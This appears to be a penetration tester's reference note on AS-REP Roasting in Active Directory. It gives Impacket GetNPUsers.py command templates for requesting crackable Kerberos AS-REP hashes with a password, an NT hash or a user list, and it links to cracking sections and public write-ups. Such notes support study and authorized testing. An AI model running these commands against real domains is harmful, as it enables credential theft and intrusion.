# Unix Shell

## 01 - Impacket

> [!IMPORTANT] Conditions
> Same exact approach like for the ServicePrincipalName for Kerberoasting as the same as the following two conditions for it. However, the only different in different hash encryption since we are ASREPRoasting (refer to [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x00 - Exploitation/0xC - Password Cracking/Offline/John The Ripper#^0c9a3c|John The Ripper]] or [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x00 - Exploitation/0xC - Password Cracking/Offline/Hashcat#^6d0af5|Hashcat]] section **under Offline Password Cracking**).

Request a Kerberos 5, etype 23, AS-REP hash from an NP user account.

```
$ GetNPUsers.py -request -dc-ip <IP> <domain>/<username>:"<password>"

$ GetNPUsers.py -request -dc-ip <IP> <domain>/<username> -hashes :<nt_hash>

$ GetNPUsers.py -request -dc-ip <IP> <domain> -usersfile users.lst
```

---
## References

### Hacktricks

- [Hacktricks: Active Directory Methodology ASREPRoast](https://book.hacktricks.wiki/en/windows/active-directory-methodology/asreproast.html)

### Hacking Articles

- [Hacking Articles: ASREPRoasting](https://www.hackingarticles.in/as-rep-roasting/)

- [Hacking Articles: Abusing Kerberos Using Impacket](https://www.hackingarticles.in/abusing-kerberos-using-impacket/)

### Pentestlab

- [Pentestlab Blog: AS-REP Roasting](https://pentestlab.blog/2024/02/20/as-rep-roasting/)

### XPNSec

- [XPNSec: Kerberos AD Attacks - More Roasting with AS-REP](https://blog.xpnsec.com/kerberos-attacks-part-2/)